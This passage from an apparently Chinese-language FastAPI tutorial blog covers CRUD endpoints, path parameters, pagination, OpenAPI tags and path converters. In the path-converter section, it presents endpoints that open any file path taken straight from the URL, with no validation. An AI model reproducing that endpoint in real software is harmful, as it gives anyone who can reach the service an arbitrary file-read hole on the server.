class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, HTTPException, status<br><span class="hljs-keyword">from</span> fastapi.encoders <span class="hljs-keyword">import</span> jsonable_encoder<br><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel<br><br>app = FastAPI(title=<span class="hljs-string">&quot;Blog CRUD&quot;</span>)<br><br><br><span class="hljs-comment"># mock db</span><br>blogs = &#123;<br>    <span class="hljs-number">1</span>: &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;blog1&quot;</span>,<br>        <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-string">&quot;this is blog1&quot;</span>,<br>        <span class="hljs-string">&quot;desc&quot;</span>: <span class="hljs-string">&quot;desc&quot;</span><br>    &#125;,<br>    <span class="hljs-number">2</span>: &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>,<br>        <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;blog2&quot;</span>,<br>        <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-string">&quot;this is blog2&quot;</span>,<br>        <span class="hljs-string">&quot;desc&quot;</span>: <span class="hljs-string">&quot;desc&quot;</span><br>    &#125;<br>&#125;<br><span class="hljs-comment"># blogs = [</span><br><span class="hljs-comment">#     &#123;</span><br><span class="hljs-comment">#         &quot;id&quot;: 1,</span><br><span class="hljs-comment">#         &quot;title&quot;: &quot;blog1&quot;,</span><br><span class="hljs-comment">#         &quot;body&quot;: &quot;this is blog1&quot;,</span><br><span class="hljs-comment">#         &quot;desc&quot;: &quot;desc&quot;</span><br><span class="hljs-comment">#     &#125;,</span><br><span class="hljs-comment">#     &#123;</span><br><span class="hljs-comment">#         &quot;id&quot;: 2,</span><br><span class="hljs-comment">#         &quot;title&quot;: &quot;blog2&quot;,</span><br><span class="hljs-comment">#         &quot;body&quot;: &quot;this is blog2&quot;,</span><br><span class="hljs-comment">#         &quot;desc&quot;: &quot;desc&quot;</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment"># ]</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Blog</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    title: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span><br>    body: typing.<span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span><br>    desc: <span class="hljs-built_in">str</span><br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/blogs&quot;</span>, tags=[<span class="hljs-string">&quot;Blog&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_blogs</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span></span>):<br>    blogs_list = <span class="hljs-built_in">list</span>(blogs.values())<br>    <span class="hljs-keyword">return</span> blogs_list[(page - <span class="hljs-number">1</span>) * size:page * size]<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/blog&quot;</span>,  tags=[<span class="hljs-string">&quot;Blog&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_blog_by_id</span>(<span class="hljs-params">blog_id: <span class="hljs-built_in">int</span></span>):<br>    blog = blogs.get(blog_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> blog:<br>        <span class="hljs-keyword">raise</span> HTTPException(<br>            status_code=status.HTTP_404_NOT_FOUND,<br>            detail=<span class="hljs-string">f&quot;Not found the blog with id: <span class="hljs-subst">&#123;blog_id&#125;</span>&quot;</span><br>        )<br>    <span class="hljs-keyword">return</span> blog<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/blog&quot;</span>,  tags=[<span class="hljs-string">&quot;Blog&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_blog</span>(<span class="hljs-params">blog: Blog</span>):<br>    blog_id = <span class="hljs-built_in">len</span>(blogs) + <span class="hljs-number">1</span><br>    blogs[blog_id] = &#123;<span class="hljs-string">&quot;id&quot;</span>: blog_id, **jsonable_encoder(blog)&#125;<br>    <span class="hljs-keyword">return</span> blogs[blog_id]<br><br><br><span class="hljs-meta">@app.put(<span class="hljs-params"><span class="hljs-string">&quot;/blog&quot;</span>,  tags=[<span class="hljs-string">&quot;Blog&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_blog</span>(<span class="hljs-params">blog_id: <span class="hljs-built_in">int</span>, blog: Blog</span>):<br>    to_update_blog = blogs.get(blog_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> to_update_blog:<br>        <span class="hljs-keyword">raise</span> HTTPException(<br>            status_code=status.HTTP_404_NOT_FOUND,<br>            detail=<span class="hljs-string">f&quot;Not found the blog with id: <span class="hljs-subst">&#123;blog_id&#125;</span>&quot;</span><br>        )<br>    to_update_blog.update(jsonable_encoder(blog))<br>    blogs[blog_id] = to_update_blog<br>    <span class="hljs-keyword">return</span> to_update_blog<br><br><br><span class="hljs-meta">@app.patch(<span class="hljs-params"><span class="hljs-string">&quot;/blog&quot;</span>,  tags=[<span class="hljs-string">&quot;Blog&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_blog2</span>(<span class="hljs-params">blog_id: <span class="hljs-built_in">int</span>, blog: Blog</span>):<br>    to_update_blog = blogs.get(blog_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> to_update_blog:<br>        <span class="hljs-keyword">raise</span> HTTPException(<br>            status_code=status.HTTP_404_NOT_FOUND,<br>            detail=<span class="hljs-string">f&quot;Not found the blog with id: <span class="hljs-subst">&#123;blog_id&#125;</span>&quot;</span><br>        )<br>    to_update_blog.update(**jsonable_encoder(blog, exclude_unset=<span class="hljs-literal">True</span>))<br>    blogs[blog_id] = to_update_blog<br>    <span class="hljs-keyword">return</span> to_update_blog<br><br><br><span class="hljs-meta">@app.delete(<span class="hljs-params"><span class="hljs-string">&quot;/blog&quot;</span>,  tags=[<span class="hljs-string">&quot;Blog&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_blog</span>(<span class="hljs-params">blog_id: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> blogs.get(blog_id):<br>        <span class="hljs-keyword">raise</span> HTTPException(<br>            status_code=status.HTTP_404_NOT_FOUND,<br>            detail=<span class="hljs-string">f&quot;Not found the blog with id: <span class="hljs-subst">&#123;blog_id&#125;</span>&quot;</span><br>        )<br>    <span class="hljs-keyword">return</span> blogs.pop(blog_id, <span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p><img src="/../img/joshua.jpg" alt="joshua"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>编程，web开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】FastAPI简单学习和路径参数（一）</title>
    <link href="/2024/01/15/681FastAPI1%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%B7%AF%E5%BE%84%E5%8F%82%E6%95%B0/"/>
    <url>/2024/01/15/681FastAPI1%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%B7%AF%E5%BE%84%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="FastApi学习"><a href="#FastApi学习" class="headerlink" title="FastApi学习"></a>FastApi学习</h1><h1 id="一、快速上手"><a href="#一、快速上手" class="headerlink" title="一、快速上手"></a>一、快速上手</h1><h2 id="第一个FastApi"><a href="#第一个FastApi" class="headerlink" title="第一个FastApi"></a>第一个FastApi</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> uvicorn<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">root</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hello World&quot;</span>&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/hello/&#123;name&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">say_hello</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Hello <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/study/&#123;address&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">say_study</span>(<span class="hljs-params">address: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">f&quot;住在： <span class="hljs-subst">&#123;address&#125;</span> &quot;</span>&#125;<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    uvicorn.run(<span class="hljs-string">&quot;main:app&quot;</span>, host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>, port=<span class="hljs-number">8080</span>, reload=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>启动方式有两种</p><ul><li><p>1、命令行启动</p><ul><li><pre><code class="shell">uvicorn main:app --reload --host 127.0.0.1 --port 8080<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>  - <br><br>- 2、执行python 脚本文件也是可以启动fastapi 项目的（调试的时候用，不推荐）<br><br>  - ```python<br>    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>        uvicorn.<span class="hljs-built_in">run</span>(<span class="hljs-string">&quot;main:app&quot;</span>, <span class="hljs-attribute">host</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-attribute">port</span>=8080, <span class="hljs-attribute">reload</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p>四个核心点：</p><ul><li>路径操作装饰器：<code>@app.get(&quot;/&quot;)</code>，在这里可以定义接口的url,并指定访问该URL使用的请求方式。比如这个例子钟，我们定义了一个URL: <code>/</code>也就是根目录，根路由，访问方式是<code>get</code>后面简称为路径装饰器</li><li>路径操作函数：<code>def root()</code>这个就是我们定义的路径操作函数，或者可以把他叫做api接口，当别人在浏览器上访问URL<code>/</code>的时候，fastapi 就会执行这个接口（对外叫接口，对内叫函数）里面的代码</li><li>接口返回值：<code>return&#123;&quot;message&quot;:&quot;hello word&quot;&#125;</code>, 这个就是api接口的返回值返回内容，也就是当我们访问URL<code>/</code>的时候，浏览器上看到的响应结果</li></ul><h2 id="1-6路径参数"><a href="#1-6路径参数" class="headerlink" title="1-6路径参数"></a>1-6路径参数</h2><p>我们把这些URL称之为路径参数。不同的URL表示不同的路径，不同的含义</p><p>在FastAPI中可以非常方便的定义和设计这些URL(或者说路径参数)，并且同时支持静态路径参数和动态路径参数</p><ul><li>静态路径 ：写死不变的URL</li><li>动态路径 ：一组格式相同，但包含动态可变的部分。比如： &#x2F;books&#x2F;2 和 &#x2F;books&#x2F;3 等等，编号是可变的。</li></ul><p>在前面的代码中，我们就定义了一个动态路径 用的是{}引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/study/&#123;address&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">say_study</span>(<span class="hljs-params">address: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">f&quot;住在： <span class="hljs-subst">&#123;address&#125;</span> &quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-7接口顺序"><a href="#1-7接口顺序" class="headerlink" title="1-7接口顺序"></a>1-7接口顺序</h2><p>如代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/study/&#123;id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">say_study</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;编号： <span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> &quot;</span>&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/study/id1&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">say_study</span>():<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;id = id 1&quot;</span>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>当请求的URL来了，FastAPI会从上往下开始匹配我们定义的接口，</p></li><li><p>动态路径传函数传递时的类型是int，而静态路径写死是一个字符串，这个时候避免报错</p></li></ul><p>解决方式是把静态的写在前面，动态的写在后面</p><h2 id="1-8分页查询"><a href="#1-8分页查询" class="headerlink" title="1-8分页查询"></a>1-8分页查询</h2><p>需求场景：</p><p>图书列表页面，该页面的图书数据都是从数据库取出来通过图书接口<code>/books</code>,返回给浏览器</p><p>但是数据库成千上万，浏览器页面显示位置有限，通常用<strong>分页展示</strong></p><ul><li>定义形参：<code>page:int,size:int</code></li><li>注意的点：URL中查询参数默认都是<strong>字符串格式</strong>，所以默认<code>page</code>和<code>size</code>都是字符串</li><li>FastAPI特性：当我们再定义形参时加上类型提示，此时FastAPI会帮我们自动做类型转换，并且因此还具备了类型校验的功能</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uvicorn<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI()<br><br>books = [<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书1&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书2&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书3&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书4&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书5&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">6</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书6&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">7</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书7&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">8</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书8&quot;</span>&#125;,<br>]<br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span>, size: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-comment"># 列表[索引1：索引2]取值</span><br>    <span class="hljs-keyword">return</span> books[(page - <span class="hljs-number">1</span>) * size:page * size]<br><br></code></pre></td></tr></table></figure><ul><li>注意： 最好使用Postman等接口调试工具去填写查询参数发起get请求(或者使用接口文档访问)</li></ul><h2 id="1-9-OpenAPI文档"><a href="#1-9-OpenAPI文档" class="headerlink" title="1-9 OpenAPI文档"></a>1-9 OpenAPI文档</h2><p>OpenAPI是swagger的底层，swagger就是基于OpenAPI封装的一层，，主要用来做接口管理</p><p>FastAPI自带的API文档且功能强大，启动服务只需要访问两个URL即可</p><ul><li>swagger : <code>ip:port/docs</code></li><li>redoc : <code>ip:port/redoc</code></li></ul><p>设置API文档标签*(还是上面的代码，在定义路由的地方加参数)*</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books&quot;</span>, tags=[<span class="hljs-string">&quot;Book&quot;</span>], description=<span class="hljs-string">&quot;设置描述信息&quot;</span>, summary=<span class="hljs-string">&#x27;设置概括信息&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span>, size: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> books[(page - <span class="hljs-number">1</span>) * size:page * size]<br></code></pre></td></tr></table></figure><p>拓展：关于<code>@app.get()</code> 装饰器用于定义 HTTP GET 请求的处理函数。它可以接受以下参数：</p><ul><li>path(必需)：表示路由的路径，即请求的 URL 路径。例如，<code>/books</code> 表示处理 <code>/books</code> 路径的 GET 请求。</li><li><code>summary</code>（可选）：提供一个简要的描述，用于生成 API 文档。通常用于描述路由的目的或功能。</li><li><code>description</code>（可选）：提供更详细的描述，用于生成 API 文档。可以在这里提供有关路由的更多信息，如用法示例、参数说明等。</li><li><code>response_model</code>（可选）：指定路由的响应模型，即返回给客户端的数据结构。可以是 Pydantic 模型类，用于验证和序列化响应数据（不用）</li><li><code>status_code</code>（可选）：指定成功响应的 HTTP 状态码。默认为 200。</li><li><code>dependencies</code>（可选）：指定用于该路由的依赖项。可以是单个依赖项或依赖项列表。</li><li><code>responses</code>（可选）：指定其他非默认响应的配置。可以自定义不同状态码的响应，例如错误处理或其他特定情况下的响应。</li></ul><p><img src="/../img/%E6%A0%87%E7%AD%BE%E4%BF%A1%E6%81%AF.png" alt="标签信息"></p><h1 id="二、Path和Query"><a href="#二、Path和Query" class="headerlink" title="二、Path和Query"></a>二、Path和Query</h1><h2 id="2-1-路径转换器"><a href="#2-1-路径转换器" class="headerlink" title="2-1 路径转换器"></a>2-1 路径转换器</h2><p>在 FastAPI 中，路径转换器是一种用于定义路由路径参数的机制。路径转换器允许你在路由路径中使用特定的参数模式，并将其捕获并传递给处理函数。</p><p>常见的路径转换器包括：</p><ul><li><code>&#123;variable&#125;</code>: 使用花括号包围的变量名称，例如 <code>&#123;item_id&#125;</code>。这种形式的路径参数将匹配路径中的任何值，并将其传递给处理函数。</li><li><code>&#123;variable:type&#125;</code>: 在花括号中指定变量的名称和类型，例如 <code>&#123;item_id:int&#125;</code>。这种形式的路径参数将匹配指定类型的值，并将其转换为相应的数据类型后传递给处理函数。</li></ul><p>示例1：使用路径转换器int,可以直接帮我们将这个参数转化为int类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br><br>app = FastAPI(title=<span class="hljs-string">&quot;路径转化器&quot;</span>)<br><br>books = &#123;<br>    <span class="hljs-number">1</span>: &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书1&quot;</span>&#125;,<br>    <span class="hljs-number">2</span>: &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书2&quot;</span>&#125;,<br>    <span class="hljs-number">3</span>: &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;图书3&quot;</span>&#125;,<br>&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books/&#123;id:int&#125;&quot;</span></span>)</span><span class="hljs-comment"># 注意 &#123;id:int&#125;  :两边不能有空格</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books_by_id</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>, <span class="hljs-built_in">type</span>(<span class="hljs-built_in">id</span>))<br>    <span class="hljs-keyword">return</span> books.get(<span class="hljs-built_in">id</span>)<br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/files/&#123;file_path&#125;&quot;</span></span>) </span><span class="hljs-comment"># 无路径转换器</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-built_in">print</span>(file_path)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/files/&#123;file_path:path&#125;&quot;</span></span>) </span><span class="hljs-comment"># path路径转换器</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-built_in">print</span>(file_path)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br></code></pre></td></tr></table></figure><p>注意1：<code>get_books_by_id(id)</code>因为此时<strong>没有在路径函数内使用类型提示，所以openapi文档没有了类型校验功能</strong>。</p><p>注意2：如果参数类型不匹配，则直接返回404 Not Found，程序是不会执行路径函数内的代码。</p><p><strong>内置5种路径转换器</strong></p><ul><li><code>str</code> 返回字符串（默认模式）</li><li><code>int</code>：返回整数</li><li><code>float</code>：返回pyhon中的float浮点数</li><li><code>uuid</code> :返回python中的uuid.UUID</li><li><code>path</code>返回一个路径，可以包含任意多个的&#x2F;</li></ul><p>补充1：这些内置转化器是Fastapi直接复用Starlette中的路径转化器</p><p>补充2：除了这5个转化器，我们也可以自定义符合自己需求的转化器（参考官网代码）</p><h2 id="2-2-路径参数枚举值"><a href="#2-2-路径参数枚举值" class="headerlink" title="2-2 路径参数枚举值"></a>2-2 路径参数枚举值</h2><p>可以定义一个数据类，枚举出几种可能性，进行限制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum<br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TagName</span>(<span class="hljs-built_in">str</span>, Enum):<span class="hljs-comment"># 多继承，python特性</span><br>    PYTHON = <span class="hljs-string">&quot;python&quot;</span><br>    LINUX = <span class="hljs-string">&quot;linux&quot;</span><br>    WEB = <span class="hljs-string">&quot;web&quot;</span><br><br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/blogs/&#123;tag&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_blogs_by_tag</span>(<span class="hljs-params">tag: TagName</span>): <span class="hljs-comment"># 类型提示</span><br>    <span class="hljs-keyword">if</span> tag == TagName.PYTHON:<br>        <span class="hljs-keyword">return</span> <span 